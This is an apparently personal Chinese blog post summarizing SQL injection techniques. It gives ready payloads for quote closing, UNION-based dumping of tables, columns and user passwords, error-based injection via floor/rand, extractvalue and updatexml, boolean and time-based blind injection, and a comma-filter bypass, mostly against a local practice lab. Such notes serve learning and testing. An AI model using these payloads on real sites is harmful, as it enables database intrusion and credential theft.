<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL注入 | yake-daigua</title><meta name="keywords" content="SQLI"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入知识点总结​		结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。 SQL概要​		1、产生原因：开发者对用户参数没有严格过滤，导致SQL语句被不合理拼接。 ​		2、危害：数据库信息泄露，被篡改甚至删除。通过into outfile写入文件导致get shell。 SQLI常见姿势(sql inje">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://yake-daigua.top/2022/11/11/SQLI/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="SQL注入知识点总结​		结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。 SQL概要​		1、产生原因：开发者对用户参数没有严格过滤，导致SQL语句被不合理拼接。 ​		2、危害：数据库信息泄露，被篡改甚至删除。通过into outfile写入文件导致get shell。 SQLI常见姿势(sql inje">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg">
<meta property="article:published_time" content="2022-11-11T08:20:21.000Z">
<meta property="article:modified_time" content="2022-11-11T10:39:44.884Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="SQLI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/11/11/SQLI/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-11 18:39:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-11T10:39:44.884Z" title="更新于 2022-11-11 18:39:44">2022-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/SQLI/">SQLI</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入知识点总结"><a href="#SQL注入知识点总结" class="headerlink" title="SQL注入知识点总结"></a>SQL注入知识点总结</h1><p>​		结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
<h2 id="SQL概要"><a href="#SQL概要" class="headerlink" title="SQL概要"></a>SQL概要</h2><p>​		1、产生原因：开发者对用户参数没有严格过滤，导致SQL语句被不合理拼接。</p>
<p>​		2、危害：数据库信息泄露，被篡改甚至删除。通过into outfile写入文件导致get shell。</p>
<h2 id="SQLI常见姿势-sql-injection"><a href="#SQLI常见姿势-sql-injection" class="headerlink" title="SQLI常见姿势(sql injection)"></a>SQLI常见姿势(sql injection)</h2><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><h4 id="单引号闭合"><a href="#单引号闭合" class="headerlink" title="单引号闭合"></a>单引号闭合</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select name,age,gender from t_students where id=&#x27;&#123;$_GET[&#x27;id&#x27;]&#125;&#x27;&quot;;</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 --+</span></span><br><span class="line"><span class="string">select name,age,gender from t_students where id=&#x27;</span><span class="number">1</span><span class="string">&#x27; and 1=2 --+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​		–+代表注释，和#(%23)相同，–+就是–空格。</p>
<p>​		观察是否存在报错，如果页面存在报错则存在注入漏洞，进行union联合注入即可。</p>
<h4 id="双引号闭合"><a href="#双引号闭合" class="headerlink" title="双引号闭合"></a>双引号闭合</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select name,age,gender from t_students where id=&quot;&#123;$_GET[<span class="string">&#x27;id&#x27;</span>]&#125;&quot;&quot;;</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=2 --+</span><br><span class="line">select name,age,gender from t_students where id=&quot;<span class="number">1</span>&quot; and 1=2 --+&quot;</span><br></pre></td></tr></table></figure>

<p>​		和单引号闭合一样，没什么好说的。</p>
<p>​		判断单双注入时：?id&#x3D;1’都会报错，?id&#x3D;1’ ‘报错则是单引号注入，否则是双引号注入。</p>
<p>​		当我们在闭合时，可能存在语句嵌套，可用  )  闭合语句。</p>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query<span class="operator">=</span>&quot;select name,age,gender from t_students where id=&#123;$_GET[&#x27;id&#x27;]&#125;;</span><br><span class="line">payload：?id=1 and 1=2 --+</span><br><span class="line">select name,age,gender from t_students where id=1 and 1=2 --+&quot;</span><br></pre></td></tr></table></figure>

<p>​		我们一般判断是字符型注入还是数字型注入，?id&#x3D;1’报错，?id&#x3D;1 and 1&#x3D;1正常，?id&#x3D;1 and 1&#x3D;2无报错无法查询则为数字型注入。</p>
<h3 id="UNION联合查询注入"><a href="#UNION联合查询注入" class="headerlink" title="UNION联合查询注入"></a>UNION联合查询注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 order by 3  --+                         //查找字段数</span></span><br><span class="line"><span class="string">payload：?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,3--+                  //与上面的payload相同 </span></span><br><span class="line"><span class="string">爆库</span></span><br><span class="line"><span class="string">payload：?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span> <span class="comment">--+       </span></span><br><span class="line">爆表</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+                             </span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">payload：?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line">爆数据</span><br><span class="line">payload：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">--&#x27;,username,&#x27;--&#x27;,password),3 from users --+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当遇到逗号被过滤掉时:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select * from (select database()) a join (select 2) b %23</span></span><br></pre></td></tr></table></figure>

<p>如果存在报错，那么非常简单，寻找回显的数字，进行注入即可。</p>
<p><em><strong>MYSQL自带数据库information_schema</strong></em></p>
<p>​		information_schema库是mySQL自带的一个库，其中包含了当前数据库管理系统的所有信息，但该数据库并不是一个实体的数据库，它不存储任何实际意义上的数据，它只是整个数据库管理系统的一个视图，当某个数据库的某个表发生变化时，information_schema库中相关的数据将同时发生变化。　　<br>​		在注入中，我们关注的是该库中的schemata、tables、columns三个表。他们分别存储了整个数据库管理系统的所有数据库信息，表信息，字段信息。在schemata表中，通过schema_name字段可以获取所有的数据库名；在tables,通过table_name、table_schema字段可以获取所有的表名与其对应的数据库名；在columns表中，通过columns、table_name、table_schema字段可以获取所有的字段名以及其所属表与数据库。<br>​		我们的注入思路就是先通过mysql的内建函数database(),获取当前数据库名，再通过tables表获取，所有的表信息，再通过columns表获取上述表所有的字段，最后通过字段查询想要的数据。</p>
<p>​		<strong>当然使用information_schema库查询信息有一个很重要的条件限制，那就是，需要当前连接数据库的用户具有读该数据库的权限。</strong></p>
<p>user 表保存数据库用户密码 和host等等信息。（user-password）</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>​		报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不行，首选报错注入。</p>
<p>​		我们在构造语句时，就是要构造让数据库报错的语句。</p>
<h5 id="group重复键冲"><a href="#group重复键冲" class="headerlink" title="group重复键冲"></a>group重复键冲</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span></span><br></pre></td></tr></table></figure>

<p>​		查询效果：从information_schema.tables表中根据拼接字段x对结果集进行计数输出。在上例中rand函数生成的随机数乘以2的范围就是0-2，那么再使用floor函数进行向下取整，其值就只能是0或者1。同时因为group by 的特性使得其在进行分组的时候会对后面的字段进行两次运算，group by 在进行分组的时候，会生成一张虚拟表记录数据，那么假设一种情况，当group by进行第一次运算的时候，发现虚拟表中没有相同的数据，准备进行插入操作，但因为rand函数的随机性，导致在第二次运算的时候产生的结果在虚拟表中已经存在，那么在插入该数据的时候就会产生主键冲突，从而产生报错信息，将我们需要的数据通过报错信息外带。</p>
<h5 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue() 函数"></a>extractvalue() 函数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure>

<p>​		与updatexml类似，第一个参数就是为了上传一个xml文档，第二个参数就是用xpath路径法查找路径，而extractvalue报错注入 就是通过再函数中写如不符合语法格式的xpath达到报错的目的，并且通过拼接sql注入语句从而通过报错查询并显示我们想要查询的内容。</p>
<h5 id="updatexml注入"><a href="#updatexml注入" class="headerlink" title="updatexml注入"></a>updatexml注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure>

<p>​		updatexml函数接受三个参数，第一个参数是一个xml格式的字符串，第二个参数是符合xpath语法规范的字符串，第三个参数是要替换成的字符串。该函数的功能就是从第一个xml字符串中通过xpath语法选择匹配的部分替换成第三个参数的内容。并且当xpath语法出现错误的时候，将会回显数据，于是我们将我们的查询语句放到第二个参数中，作为错误回显的一部分外带到客户端浏览器。</p>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>​		几何函数注入，基于列名冲突的注入，基于溢出的注入等。存在版本限制，如有需要，自行查阅相关资料。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>​		没有错误回显时进行的注入，用&#x3D;判断，用sleep()判断。</p>
<h5 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h5><p>​		利用页面显示的不同。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) --+</span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1：判断当前数据库的长度，利用二分法</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+   //115为ascii表中的十进制，对应字母s</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> admin) <span class="comment">--+           //猜测当前数据库中是否存在admin表</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：判断当前数据库中表的个数</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">2：判断每个表的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">6</span> <span class="comment">--+           //第一张表</span></span><br><span class="line"> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))&gt;6 --+           //第二张表 </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">3：判断每个表的每个字符的ascii值</span></span><br><span class="line"><span class="string">//判断第一个表的第一个字符的ascii值</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个表的第二个字符的ascii值               </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断表字段的个数</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段的长度</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">//判断第二个字段的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段第一个字符的assii</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断第一个字段第二个字符的assii</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断id字段的第一个数据的长度</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select id from users limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">// 判断id字段的第二个数据的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">// 判断id字段的第二行数据的第二个字符的ascii值</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>​		可借助burp suite或者自行写python脚本实现，手工注入不太现实。</p>
<h5 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h5><p>​		看浏览器跳转的时间判断注入。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if( ascii(substr(database(),1,1))= 115 ,sleep(5),0) --+</span></span><br><span class="line"><span class="string">ascii(substr(database(),1,1))= 115</span></span><br><span class="line"><span class="string">可以看看strcmp函数的使用，下面给出一个实战的例子</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>  <span class="keyword">and</span> if((strcmp((substr((<span class="keyword">select</span> password<span class="comment">/* -- + %0afrom/**/</span>users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="string">&#x27;D&#x27;</span>)),<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>​		与报错注入相同，不再赘述。</p>
<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h5 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h5><p>​		User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。</p>
